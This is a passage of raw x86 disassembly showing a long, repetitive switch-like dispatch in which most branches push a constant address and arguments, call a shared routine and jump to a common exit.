  403583:	c7 86 48 09 00 00 ff 	movl   $0xffffffff,0x948(%esi)
  40358a:	ff ff ff 
  40358d:	e8 6b 0d 00 00       	call   0x4042fd
  403592:	8b 86 40 09 00 00    	mov    0x940(%esi),%eax
  403598:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40359e:	8d 65 f4             	lea    -0xc(%ebp),%esp
  4035a1:	5e                   	pop    %esi
  4035a2:	5f                   	pop    %edi
  4035a3:	5b                   	pop    %ebx
  4035a4:	5d                   	pop    %ebp
  4035a5:	c3                   	ret
  4035a6:	68 4c d2 42 00       	push   $0x42d24c
  4035ab:	68 a0 80 4f 00       	push   $0x4f80a0
  4035b0:	50                   	push   %eax
  4035b1:	53                   	push   %ebx
  4035b2:	e8 09 86 02 00       	call   0x42bbc0
  4035b7:	83 c4 10             	add    $0x10,%esp
  4035ba:	e9 fd 09 00 00       	jmp    0x403fbc
  4035bf:	ff b6 e8 00 00 00    	push   0xe8(%esi)
  4035c5:	50                   	push   %eax
  4035c6:	e8 f5 83 02 00       	call   0x42b9c0
  4035cb:	83 c4 08             	add    $0x8,%esp
  4035ce:	e9 e9 09 00 00       	jmp    0x403fbc
  4035d3:	ff b6 e8 00 00 00    	push   0xe8(%esi)
  4035d9:	50                   	push   %eax
  4035da:	e8 e1 83 02 00       	call   0x42b9c0
  4035df:	83 c4 08             	add    $0x8,%esp
  4035e2:	e9 d5 09 00 00       	jmp    0x403fbc
  4035e7:	6a 11                	push   $0x11
  4035e9:	6a 01                	push   $0x1
  4035eb:	e8 c2 83 02 00       	call   0x42b9b2
  4035f0:	83 c4 08             	add    $0x8,%esp
  4035f3:	e9 c4 09 00 00       	jmp    0x403fbc
  4035f8:	52                   	push   %edx
  4035f9:	50                   	push   %eax
  4035fa:	e8 c1 83 02 00       	call   0x42b9c0
  4035ff:	83 c4 08             	add    $0x8,%esp
  403602:	e9 b5 09 00 00       	jmp    0x403fbc
  403607:	ff b6 e8 04 00 00    	push   0x4e8(%esi)
  40360d:	50                   	push   %eax
  40360e:	e8 ad 83 02 00       	call   0x42b9c0
  403613:	83 c4 08             	add    $0x8,%esp
  403616:	e9 a1 09 00 00       	jmp    0x403fbc
  40361b:	6a 03                	push   $0x3
  40361d:	6a 01                	push   $0x1
  40361f:	e8 8e 83 02 00       	call   0x42b9b2
  403624:	83 c4 08             	add    $0x8,%esp
  403627:	e9 90 09 00 00       	jmp    0x403fbc
  40362c:	6a 02                	push   $0x2
  40362e:	6a 01                	push   $0x1
  403630:	e8 7d 83 02 00       	call   0x42b9b2
  403635:	83 c4 08             	add    $0x8,%esp
  403638:	e9 7f 09 00 00       	jmp    0x403fbc
  40363d:	c7 86 48 09 00 00 08 	movl   $0x8,0x948(%esi)
  403644:	00 00 00 
  403647:	68 54 d9 42 00       	push   $0x42d954
  40364c:	68 4c 04 00 00       	push   $0x44c
  403651:	53                   	push   %ebx
  403652:	e8 dd 87 02 00       	call   0x42be34
  403657:	83 c4 0c             	add    $0xc,%esp
  40365a:	e9 5d 09 00 00       	jmp    0x403fbc
  40365f:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403666:	00 00 00 
  403669:	68 dc d9 42 00       	push   $0x42d9dc
  40366e:	52                   	push   %edx
  40366f:	51                   	push   %ecx
  403670:	e8 bf 87 02 00       	call   0x42be34
  403675:	83 c4 0c             	add    $0xc,%esp
  403678:	e9 3f 09 00 00       	jmp    0x403fbc
  40367d:	c7 86 48 09 00 00 0c 	movl   $0xc,0x948(%esi)
  403684:	00 00 00 
  403687:	31 c0                	xor    %eax,%eax
  403689:	68 d8 da 42 00       	push   $0x42dad8
  40368e:	50                   	push   %eax
  40368f:	50                   	push   %eax
  403690:	e8 9f 87 02 00       	call   0x42be34
  403695:	83 c4 0c             	add    $0xc,%esp
  403698:	e9 1f 09 00 00       	jmp    0x403fbc
  40369d:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4036a4:	00 00 00 
  4036a7:	68 c0 d6 42 00       	push   $0x42d6c0
  4036ac:	53                   	push   %ebx
  4036ad:	50                   	push   %eax
  4036ae:	e8 81 87 02 00       	call   0x42be34
  4036b3:	83 c4 0c             	add    $0xc,%esp
  4036b6:	e9 01 09 00 00       	jmp    0x403fbc
  4036bb:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4036c2:	00 00 00 
  4036c5:	68 d0 d6 42 00       	push   $0x42d6d0
  4036ca:	53                   	push   %ebx
  4036cb:	50                   	push   %eax
  4036cc:	e8 63 87 02 00       	call   0x42be34
  4036d1:	83 c4 0c             	add    $0xc,%esp
  4036d4:	e9 e3 08 00 00       	jmp    0x403fbc
  4036d9:	8b 56 4c             	mov    0x4c(%esi),%edx
  4036dc:	8b 46 24             	mov    0x24(%esi),%eax
  4036df:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4036e6:	00 00 00 
  4036e9:	03 56 1c             	add    0x1c(%esi),%edx
  4036ec:	03 46 20             	add    0x20(%esi),%eax
  4036ef:	01 d0                	add    %edx,%eax
  4036f1:	8d 44 03 24          	lea    0x24(%ebx,%eax,1),%eax
  4036f5:	68 74 d7 42 00       	push   $0x42d774
  4036fa:	51                   	push   %ecx
  4036fb:	50                   	push   %eax
  4036fc:	e8 33 87 02 00       	call   0x42be34
  403701:	83 c4 0c             	add    $0xc,%esp
  403704:	e9 b3 08 00 00       	jmp    0x403fbc
  403709:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403710:	00 00 00 
  403713:	68 e0 d6 42 00       	push   $0x42d6e0
  403718:	53                   	push   %ebx
  403719:	50                   	push   %eax
  40371a:	e8 15 87 02 00       	call   0x42be34
  40371f:	83 c4 0c             	add    $0xc,%esp
  403722:	e9 95 08 00 00       	jmp    0x403fbc
  403727:	8b 56 5c             	mov    0x5c(%esi),%edx
  40372a:	8b 46 24             	mov    0x24(%esi),%eax
  40372d:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403734:	00 00 00 
  403737:	c1 e2 10             	shl    $0x10,%edx
  40373a:	03 46 20             	add    0x20(%esi),%eax
  40373d:	03 56 1c             	add    0x1c(%esi),%edx
  403740:	01 d0                	add    %edx,%eax
  403742:	8d 44 03 25          	lea    0x25(%ebx,%eax,1),%eax
  403746:	68 84 d7 42 00       	push   $0x42d784
  40374b:	51                   	push   %ecx
  40374c:	50                   	push   %eax
  40374d:	e8 e2 86 02 00       	call   0x42be34
  403752:	83 c4 0c             	add    $0xc,%esp
  403755:	e9 62 08 00 00       	jmp    0x403fbc
  40375a:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403761:	00 00 00 
  403764:	68 f0 d6 42 00       	push   $0x42d6f0
  403769:	53                   	push   %ebx
  40376a:	50                   	push   %eax
  40376b:	e8 c4 86 02 00       	call   0x42be34
  403770:	83 c4 0c             	add    $0xc,%esp
  403773:	e9 44 08 00 00       	jmp    0x403fbc
  403778:	8b 56 4c             	mov    0x4c(%esi),%edx
  40377b:	8b 46 24             	mov    0x24(%esi),%eax
  40377e:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403785:	00 00 00 
  403788:	03 56 1c             	add    0x1c(%esi),%edx
  40378b:	03 46 20             	add    0x20(%esi),%eax
  40378e:	01 d0                	add    %edx,%eax
  403790:	8d 44 03 26          	lea    0x26(%ebx,%eax,1),%eax
  403794:	68 94 d7 42 00       	push   $0x42d794
  403799:	51                   	push   %ecx
  40379a:	50                   	push   %eax
  40379b:	e8 94 86 02 00       	call   0x42be34
  4037a0:	83 c4 0c             	add    $0xc,%esp
  4037a3:	e9 14 08 00 00       	jmp    0x403fbc
  4037a8:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4037af:	00 00 00 
  4037b2:	68 00 d7 42 00       	push   $0x42d700
  4037b7:	53                   	push   %ebx
  4037b8:	50                   	push   %eax
  4037b9:	e8 76 86 02 00       	call   0x42be34
  4037be:	83 c4 0c             	add    $0xc,%esp
  4037c1:	e9 f6 07 00 00       	jmp    0x403fbc
  4037c6:	8b 56 5c             	mov    0x5c(%esi),%edx
  4037c9:	8b 46 24             	mov    0x24(%esi),%eax
  4037cc:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4037d3:	00 00 00 
  4037d6:	c1 e2 10             	shl    $0x10,%edx
  4037d9:	03 46 20             	add    0x20(%esi),%eax
  4037dc:	03 56 1c             	add    0x1c(%esi),%edx
  4037df:	01 d0                	add    %edx,%eax
  4037e1:	8d 44 03 27          	lea    0x27(%ebx,%eax,1),%eax
  4037e5:	68 a4 d7 42 00       	push   $0x42d7a4
  4037ea:	51                   	push   %ecx
  4037eb:	50                   	push   %eax
  4037ec:	e8 43 86 02 00       	call   0x42be34
  4037f1:	83 c4 0c             	add    $0xc,%esp
  4037f4:	e9 c3 07 00 00       	jmp    0x403fbc
  4037f9:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403800:	00 00 00 
  403803:	68 10 d7 42 00       	push   $0x42d710
  403808:	53                   	push   %ebx
  403809:	50                   	push   %eax
  40380a:	e8 25 86 02 00       	call   0x42be34
  40380f:	83 c4 0c             	add    $0xc,%esp
  403812:	e9 a5 07 00 00       	jmp    0x403fbc
  403817:	8b 56 4c             	mov    0x4c(%esi),%edx
  40381a:	8b 46 24             	mov    0x24(%esi),%eax
  40381d:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403824:	00 00 00 
  403827:	03 56 1c             	add    0x1c(%esi),%edx
  40382a:	03 46 20             	add    0x20(%esi),%eax
  40382d:	01 d0                	add    %edx,%eax
  40382f:	8d 44 03 20          	lea    0x20(%ebx,%eax,1),%eax
  403833:	68 b4 d7 42 00       	push   $0x42d7b4
  403838:	51                   	push   %ecx
  403839:	50                   	push   %eax
  40383a:	e8 f5 85 02 00       	call   0x42be34
  40383f:	83 c4 0c             	add    $0xc,%esp
  403842:	e9 75 07 00 00       	jmp    0x403fbc
  403847:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40384e:	00 00 00 
  403851:	68 20 d7 42 00       	push   $0x42d720
  403856:	53                   	push   %ebx
  403857:	50                   	push   %eax
  403858:	e8 d7 85 02 00       	call   0x42be34
  40385d:	83 c4 0c             	add    $0xc,%esp
  403860:	e9 57 07 00 00       	jmp    0x403fbc
  403865:	8b 56 5c             	mov    0x5c(%esi),%edx
  403868:	8b 46 24             	mov    0x24(%esi),%eax
  40386b:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403872:	00 00 00 
  403875:	c1 e2 10             	shl    $0x10,%edx
  403878:	03 46 20             	add    0x20(%esi),%eax
  40387b:	03 56 1c             	add    0x1c(%esi),%edx
  40387e:	01 d0                	add    %edx,%eax
  403880:	8d 44 03 21          	lea    0x21(%ebx,%eax,1),%eax
  403884:	68 c4 d7 42 00       	push   $0x42d7c4
  403889:	51                   	push   %ecx
  40388a:	50                   	push   %eax
  40388b:	e8 a4 85 02 00       	call   0x42be34
  403890:	83 c4 0c             	add    $0xc,%esp
  403893:	e9 24 07 00 00       	jmp    0x403fbc
  403898:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40389f:	00 00 00 
  4038a2:	68 90 d6 42 00       	push   $0x42d690
  4038a7:	53                   	push   %ebx
  4038a8:	50                   	push   %eax
  4038a9:	e8 86 85 02 00       	call   0x42be34
  4038ae:	83 c4 0c             	add    $0xc,%esp
  4038b1:	e9 06 07 00 00       	jmp    0x403fbc
  4038b6:	8b 56 4c             	mov    0x4c(%esi),%edx
  4038b9:	8b 46 24             	mov    0x24(%esi),%eax
  4038bc:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4038c3:	00 00 00 
  4038c6:	03 56 1c             	add    0x1c(%esi),%edx
  4038c9:	03 46 20             	add    0x20(%esi),%eax
  4038cc:	01 d0                	add    %edx,%eax
  4038ce:	8d 44 03 3e          	lea    0x3e(%ebx,%eax,1),%eax
  4038d2:	68 14 d8 42 00       	push   $0x42d814
  4038d7:	51                   	push   %ecx
  4038d8:	50                   	push   %eax
  4038d9:	e8 56 85 02 00       	call   0x42be34
  4038de:	83 c4 0c             	add    $0xc,%esp
  4038e1:	e9 d6 06 00 00       	jmp    0x403fbc
  4038e6:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4038ed:	00 00 00 
  4038f0:	68 50 d6 42 00       	push   $0x42d650
  4038f5:	53                   	push   %ebx
  4038f6:	50                   	push   %eax
  4038f7:	e8 38 85 02 00       	call   0x42be34
  4038fc:	83 c4 0c             	add    $0xc,%esp
  4038ff:	e9 b8 06 00 00       	jmp    0x403fbc
  403904:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40390b:	00 00 00 
  40390e:	68 a0 d6 42 00       	push   $0x42d6a0
  403913:	53                   	push   %ebx
  403914:	50                   	push   %eax
  403915:	e8 1a 85 02 00       	call   0x42be34
  40391a:	83 c4 0c             	add    $0xc,%esp
  40391d:	e9 9a 06 00 00       	jmp    0x403fbc
  403922:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403929:	00 00 00 
  40392c:	68 30 d7 42 00       	push   $0x42d730
  403931:	53                   	push   %ebx
  403932:	52                   	push   %edx
  403933:	e8 fc 84 02 00       	call   0x42be34
  403938:	83 c4 0c             	add    $0xc,%esp
  40393b:	e9 7c 06 00 00       	jmp    0x403fbc
  403940:	8b 56 4c             	mov    0x4c(%esi),%edx
  403943:	8b 46 24             	mov    0x24(%esi),%eax
  403946:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  40394d:	00 00 00 
  403950:	03 56 1c             	add    0x1c(%esi),%edx
  403953:	03 46 20             	add    0x20(%esi),%eax
  403956:	01 d0                	add    %edx,%eax
  403958:	8d 44 03 22          	lea    0x22(%ebx,%eax,1),%eax
  40395c:	68 d4 d7 42 00       	push   $0x42d7d4
  403961:	51                   	push   %ecx
  403962:	50                   	push   %eax
  403963:	e8 cc 84 02 00       	call   0x42be34
  403968:	83 c4 0c             	add    $0xc,%esp
  40396b:	e9 4c 06 00 00       	jmp    0x403fbc
  403970:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403977:	00 00 00 
  40397a:	68 60 d6 42 00       	push   $0x42d660
  40397f:	53                   	push   %ebx
  403980:	50                   	push   %eax
  403981:	e8 ae 84 02 00       	call   0x42be34
  403986:	83 c4 0c             	add    $0xc,%esp
  403989:	e9 2e 06 00 00       	jmp    0x403fbc
  40398e:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403995:	00 00 00 
  403998:	68 40 d7 42 00       	push   $0x42d740
  40399d:	ff 76 18             	push   0x18(%esi)
  4039a0:	ff 76 0c             	push   0xc(%esi)
  4039a3:	e8 8c 84 02 00       	call   0x42be34
  4039a8:	83 c4 0c             	add    $0xc,%esp
  4039ab:	e9 0c 06 00 00       	jmp    0x403fbc
  4039b0:	8b 56 5c             	mov    0x5c(%esi),%edx
  4039b3:	8b 46 24             	mov    0x24(%esi),%eax
  4039b6:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4039bd:	00 00 00 
  4039c0:	c1 e2 10             	shl    $0x10,%edx
  4039c3:	03 46 20             	add    0x20(%esi),%eax
  4039c6:	03 56 1c             	add    0x1c(%esi),%edx
  4039c9:	01 d0                	add    %edx,%eax
  4039cb:	8d 44 03 23          	lea    0x23(%ebx,%eax,1),%eax
  4039cf:	68 e4 d7 42 00       	push   $0x42d7e4
  4039d4:	51                   	push   %ecx
  4039d5:	50                   	push   %eax
  4039d6:	e8 59 84 02 00       	call   0x42be34
  4039db:	83 c4 0c             	add    $0xc,%esp
  4039de:	e9 d9 05 00 00       	jmp    0x403fbc
  4039e3:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  4039ea:	00 00 00 
  4039ed:	68 70 d6 42 00       	push   $0x42d670
  4039f2:	53                   	push   %ebx
  4039f3:	50                   	push   %eax
  4039f4:	e8 3b 84 02 00       	call   0x42be34
  4039f9:	83 c4 0c             	add    $0xc,%esp
  4039fc:	e9 bb 05 00 00       	jmp    0x403fbc
  403a01:	8b 56 4c             	mov    0x4c(%esi),%edx
  403a04:	8b 46 24             	mov    0x24(%esi),%eax
  403a07:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403a0e:	00 00 00 
  403a11:	03 56 1c             	add    0x1c(%esi),%edx
  403a14:	03 46 20             	add    0x20(%esi),%eax
  403a17:	01 d0                	add    %edx,%eax
  403a19:	8d 44 03 3c          	lea    0x3c(%ebx,%eax,1),%eax
  403a1d:	68 f4 d7 42 00       	push   $0x42d7f4
  403a22:	51                   	push   %ecx
  403a23:	50                   	push   %eax
  403a24:	e8 0b 84 02 00       	call   0x42be34
  403a29:	83 c4 0c             	add    $0xc,%esp
  403a2c:	e9 8b 05 00 00       	jmp    0x403fbc
  403a31:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403a38:	00 00 00 
  403a3b:	68 80 d6 42 00       	push   $0x42d680
  403a40:	53                   	push   %ebx
  403a41:	50                   	push   %eax
  403a42:	e8 ed 83 02 00       	call   0x42be34
  403a47:	83 c4 0c             	add    $0xc,%esp
  403a4a:	e9 6d 05 00 00       	jmp    0x403fbc
  403a4f:	8b 56 5c             	mov    0x5c(%esi),%edx
  403a52:	8b 46 24             	mov    0x24(%esi),%eax
  403a55:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403a5c:	00 00 00 
  403a5f:	c1 e2 10             	shl    $0x10,%edx
  403a62:	03 46 20             	add    0x20(%esi),%eax
  403a65:	03 56 1c             	add    0x1c(%esi),%edx
  403a68:	01 d0                	add    %edx,%eax
  403a6a:	8d 44 03 3d          	lea    0x3d(%ebx,%eax,1),%eax
  403a6e:	68 04 d8 42 00       	push   $0x42d804
  403a73:	51                   	push   %ecx
  403a74:	50                   	push   %eax
  403a75:	e8 ba 83 02 00       	call   0x42be34
  403a7a:	83 c4 0c             	add    $0xc,%esp
  403a7d:	e9 3a 05 00 00       	jmp    0x403fbc
  403a82:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  403a85:	8b 46 24             	mov    0x24(%esi),%eax
  403a88:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403a8f:	00 00 00 
  403a92:	c1 e1 10             	shl    $0x10,%ecx
  403a95:	03 46 20             	add    0x20(%esi),%eax
  403a98:	03 4e 1c             	add    0x1c(%esi),%ecx
  403a9b:	01 c8                	add    %ecx,%eax
  403a9d:	8d 44 03 3f          	lea    0x3f(%ebx,%eax,1),%eax
  403aa1:	68 24 d8 42 00       	push   $0x42d824
  403aa6:	ff 76 18             	push   0x18(%esi)
  403aa9:	50                   	push   %eax
  403aaa:	e8 85 83 02 00       	call   0x42be34
  403aaf:	83 c4 0c             	add    $0xc,%esp
  403ab2:	e9 05 05 00 00       	jmp    0x403fbc
  403ab7:	c7 86 48 09 00 00 00 	movl   $0x0,0x948(%esi)
  403abe:	00 00 00 
  403ac1:	68 b0 d6 42 00       	push   $0x42d6b0
  403ac6:	53                   	push   %ebx
  403ac7:	50                   	push   %eax
  403ac8:	e8 67 83 02 00       	call   0x42be34
  403acd:	83 c4 0c             	add    $0xc,%esp
  403ad0:	e9 e7 04 00 00       	jmp    0x403fbc
  403ad5:	c7 86 48 09 00 00 02 	movl   $0x2,0x948(%esi)
  403adc:	00 00 00 
  403adf:	6a 00                	push   $0x0
  403ae1:	e8 da a7 00 00       	call   0x40e2c0
  403ae6:	83 c4 04             	add    $0x4,%esp
  403ae9:	e9 ce 04 00 00       	jmp    0x403fbc
  403aee:	68 ac d2 42 00       	push   $0x42d2ac
  403af3:	57                   	push   %edi
  403af4:	50                   	push   %eax
  403af5:	e8 3a 83 02 00       	call   0x42be34
  403afa:	83 c4 0c             	add    $0xc,%esp
  403afd:	e9 ba 04 00 00       	jmp    0x403fbc
  403b02:	68 bc d2 42 00       	push   $0x42d2bc
  403b07:	57                   	push   %edi
  403b08:	50                   	push   %eax
  403b09:	e8 26 83 02 00       	call   0x42be34
  403b0e:	83 c4 0c             	add    $0xc,%esp
  403b11:	e9 a6 04 00 00       	jmp    0x403fbc
  403b16:	68 cc d2 42 00       	push   $0x42d2cc
  403b1b:	ff 76 18             	push   0x18(%esi)
  403b1e:	51                   	push   %ecx
  403b1f:	e8 10 83 02 00       	call   0x42be34
  403b24:	83 c4 0c             	add    $0xc,%esp
  403b27:	e9 90 04 00 00       	jmp    0x403fbc
  403b2c:	68 9c d2 42 00       	push   $0x42d29c
  403b31:	57                   	push   %edi
  403b32:	53                   	push   %ebx
  403b33:	e8 fc 82 02 00       	call   0x42be34
  403b38:	83 c4 0c             	add    $0xc,%esp
  403b3b:	e9 7c 04 00 00       	jmp    0x403fbc
  403b40:	68 dc d2 42 00       	push   $0x42d2dc
  403b45:	57                   	push   %edi
  403b46:	50                   	push   %eax
  403b47:	e8 e8 82 02 00       	call   0x42be34
  403b4c:	83 c4 0c             	add    $0xc,%esp
  403b4f:	e9 68 04 00 00       	jmp    0x403fbc
  403b54:	68 ec d2 42 00       	push   $0x42d2ec
  403b59:	57                   	push   %edi
  403b5a:	50                   	push   %eax
  403b5b:	e8 d4 82 02 00       	call   0x42be34
  403b60:	83 c4 0c             	add    $0xc,%esp
  403b63:	e9 54 04 00 00       	jmp    0x403fbc
  403b68:	68 fc d2 42 00       	push   $0x42d2fc
  403b6d:	57                   	push   %edi
  403b6e:	50                   	push   %eax
  403b6f:	e8 c0 82 02 00       	call   0x42be34
  403b74:	83 c4 0c             	add    $0xc,%esp
  403b77:	e9 40 04 00 00       	jmp    0x403fbc
  403b7c:	68 0c d3 42 00       	push   $0x42d30c
  403b81:	57                   	push   %edi
  403b82:	50                   	push   %eax
  403b83:	e8 ac 82 02 00       	call   0x42be34
  403b88:	83 c4 0c             	add    $0xc,%esp
  403b8b:	e9 2c 04 00 00       	jmp    0x403fbc
  403b90:	68 1c d3 42 00       	push   $0x42d31c
  403b95:	57                   	push   %edi
  403b96:	ff 76 0c             	push   0xc(%esi)
  403b99:	e8 96 82 02 00       	call   0x42be34
  403b9e:	83 c4 0c             	add    $0xc,%esp
  403ba1:	e9 16 04 00 00       	jmp    0x403fbc
  403ba6:	68 2c d3 42 00       	push   $0x42d32c
  403bab:	57                   	push   %edi
  403bac:	50                   	push   %eax
  403bad:	e8 82 82 02 00       	call   0x42be34
  403bb2:	83 c4 0c             	add    $0xc,%esp
  403bb5:	e9 02 04 00 00       	jmp    0x403fbc
  403bba:	68 4c d3 42 00       	push   $0x42d34c
  403bbf:	57                   	push   %edi
  403bc0:	50                   	push   %eax
  403bc1:	e8 6e 82 02 00       	call   0x42be34
  403bc6:	83 c4 0c             	add    $0xc,%esp
  403bc9:	e9 ee 03 00 00       	jmp    0x403fbc
  403bce:	68 2c d4 42 00       	push   $0x42d42c
  403bd3:	57                   	push   %edi
  403bd4:	50                   	push   %eax
  403bd5:	e8 5a 82 02 00       	call   0x42be34
  403bda:	83 c4 0c             	add    $0xc,%esp
  403bdd:	e9 da 03 00 00       	jmp    0x403fbc
  403be2:	68 08 d5 42 00       	push   $0x42d508
  403be7:	57                   	push   %edi
  403be8:	50                   	push   %eax
  403be9:	e8 46 82 02 00       	call   0x42be34
  403bee:	83 c4 0c             	add    $0xc,%esp
  403bf1:	e9 c6 03 00 00       	jmp    0x403fbc
  403bf6:	68 e8 d5 42 00       	push   $0x42d5e8
  403bfb:	57                   	push   %edi
  403bfc:	ff 76 08             	push   0x8(%esi)
  403bff:	e8 30 82 02 00       	call   0x42be34
  403c04:	83 c4 0c             	add    $0xc,%esp
  403c07:	e9 b0 03 00 00       	jmp    0x403fbc
  403c0c:	68 18 d5 42 00       	push   $0x42d518
  403c11:	57                   	push   %edi
  403c12:	50                   	push   %eax
  403c13:	e8 1c 82 02 00       	call   0x42be34
  403c18:	83 c4 0c             	add    $0xc,%esp
  403c1b:	e9 9c 03 00 00       	jmp    0x403fbc
  403c20:	68 3c d3 42 00       	push   $0x42d33c
  403c25:	57                   	push   %edi
  403c26:	50                   	push   %eax
  403c27:	e8 08 82 02 00       	call   0x42be34
  403c2c:	83 c4 0c             	add    $0xc,%esp
  403c2f:	e9 88 03 00 00       	jmp    0x403fbc
  403c34:	68 1c d4 42 00       	push   $0x42d41c
  403c39:	57                   	push   %edi
  403c3a:	50                   	push   %eax
  403c3b:	e8 f4 81 02 00       	call   0x42be34
  403c40:	83 c4 0c             	add    $0xc,%esp
  403c43:	e9 74 03 00 00       	jmp    0x403fbc
  403c48:	68 f8 d4 42 00       	push   $0x42d4f8
  403c4d:	57                   	push   %edi
  403c4e:	50                   	push   %eax
  403c4f:	e8 e0 81 02 00       	call   0x42be34
  403c54:	83 c4 0c             	add    $0xc,%esp
  403c57:	e9 60 03 00 00       	jmp    0x403fbc
  403c5c:	68 d8 d5 42 00       	push   $0x42d5d8
  403c61:	57                   	push   %edi
  403c62:	50                   	push   %eax
  403c63:	e8 cc 81 02 00       	call   0x42be34
  403c68:	83 c4 0c             	add    $0xc,%esp
  403c6b:	e9 4c 03 00 00       	jmp    0x403fbc
  403c70:	68 5c d3 42 00       	push   $0x42d35c
  403c75:	57                   	push   %edi
  403c76:	50                   	push   %eax
  403c77:	e8 b8 81 02 00       	call   0x42be34
  403c7c:	83 c4 0c             	add    $0xc,%esp
  403c7f:	e9 38 03 00 00       	jmp    0x403fbc
  403c84:	68 3c d4 42 00       	push   $0x42d43c
  403c89:	57                   	push   %edi
  403c8a:	50                   	push   %eax
  403c8b:	e8 a4 81 02 00       	call   0x42be34
  403c90:	83 c4 0c             	add    $0xc,%esp
  403c93:	e9 24 03 00 00       	jmp    0x403fbc
  403c98:	68 f8 d5 42 00       	push   $0x42d5f8
  403c9d:	ff 76 18             	push   0x18(%esi)
  403ca0:	ff 76 14             	push   0x14(%esi)
  403ca3:	e8 8c 81 02 00       	call   0x42be34
  403ca8:	83 c4 0c             	add    $0xc,%esp
  403cab:	e9 0c 03 00 00       	jmp    0x403fbc
  403cb0:	68 28 d5 42 00       	push   $0x42d528
  403cb5:	57                   	push   %edi
  403cb6:	50                   	push   %eax
  403cb7:	e8 78 81 02 00       	call   0x42be34
  403cbc:	83 c4 0c             	add    $0xc,%esp
  403cbf:	e9 f8 02 00 00       	jmp    0x403fbc
  403cc4:	68 6c d3 42 00       	push   $0x42d36c
  403cc9:	57                   	push   %edi
  403cca:	50                   	push   %eax
  403ccb:	e8 64 81 02 00       	call   0x42be34
  403cd0:	83 c4 0c             	add    $0xc,%esp
  403cd3:	e9 e4 02 00 00       	jmp    0x403fbc
  403cd8:	68 7c d3 42 00       	push   $0x42d37c
  403cdd:	57                   	push   %edi
  403cde:	50                   	push   %eax
  403cdf:	e8 50 81 02 00       	call   0x42be34
  403ce4:	83 c4 0c             	add    $0xc,%esp
  403ce7:	e9 d0 02 00 00       	jmp    0x403fbc
  403cec:	68 4c d4 42 00       	push   $0x42d44c
  403cf1:	57                   	push   %edi
  403cf2:	50                   	push   %eax
  403cf3:	e8 3c 81 02 00       	call   0x42be34
  403cf8:	83 c4 0c             	add    $0xc,%esp
  403cfb:	e9 bc 02 00 00       	jmp    0x403fbc
  403d00:	68 5c d4 42 00       	push   $0x42d45c
  403d05:	57                   	push   %edi
  403d06:	50                   	push   %eax
  403d07:	e8 28 81 02 00       	call   0x42be34
  403d0c:	83 c4 0c             	add    $0xc,%esp
  403d0f:	e9 a8 02 00 00       	jmp    0x403fbc
  403d14:	68 38 d5 42 00       	push   $0x42d538
  403d19:	57                   	push   %edi
  403d1a:	50                   	push   %eax
  403d1b:	e8 14 81 02 00       	call   0x42be34
  403d20:	83 c4 0c             	add    $0xc,%esp
  403d23:	e9 94 02 00 00       	jmp    0x403fbc
  403d28:	68 8c d3 42 00       	push   $0x42d38c
  403d2d:	57                   	push   %edi
  403d2e:	50                   	push   %eax
  403d2f:	e8 00 81 02 00       	call   0x42be34
  403d34:	83 c4 0c             	add    $0xc,%esp
  403d37:	e9 80 02 00 00       	jmp    0x403fbc
  403d3c:	68 9c d3 42 00       	push   $0x42d39c
  403d41:	57                   	push   %edi
  403d42:	50                   	push   %eax
  403d43:	e8 ec 80 02 00       	call   0x42be34
  403d48:	83 c4 0c             	add    $0xc,%esp
  403d4b:	e9 6c 02 00 00       	jmp    0x403fbc
  403d50:	68 6c d4 42 00       	push   $0x42d46c
  403d55:	57                   	push   %edi
  403d56:	50                   	push   %eax
  403d57:	e8 d8 80 02 00       	call   0x42be34
  403d5c:	83 c4 0c             	add    $0xc,%esp
  403d5f:	e9 58 02 00 00       	jmp    0x403fbc
  403d64:	68 48 d5 42 00       	push   $0x42d548
  403d69:	57                   	push   %edi
  403d6a:	50                   	push   %eax
  403d6b:	e8 c4 80 02 00       	call   0x42be34
  403d70:	83 c4 0c             	add    $0xc,%esp
  403d73:	e9 44 02 00 00       	jmp    0x403fbc
  403d78:	68 58 d5 42 00       	push   $0x42d558
  403d7d:	57                   	push   %edi
  403d7e:	50                   	push   %eax
  403d7f:	e8 b0 80 02 00       	call   0x42be34
  403d84:	83 c4 0c             	add    $0xc,%esp
  403d87:	e9 30 02 00 00       	jmp    0x403fbc
  403d8c:	68 ac d3 42 00       	push   $0x42d3ac
  403d91:	57                   	push   %edi
  403d92:	50                   	push   %eax
  403d93:	e8 9c 80 02 00       	call   0x42be34
  403d98:	83 c4 0c             	add    $0xc,%esp
  403d9b:	e9 1c 02 00 00       	jmp    0x403fbc
  403da0:	68 7c d4 42 00       	push   $0x42d47c
  403da5:	57                   	push   %edi
  403da6:	50                   	push   %eax
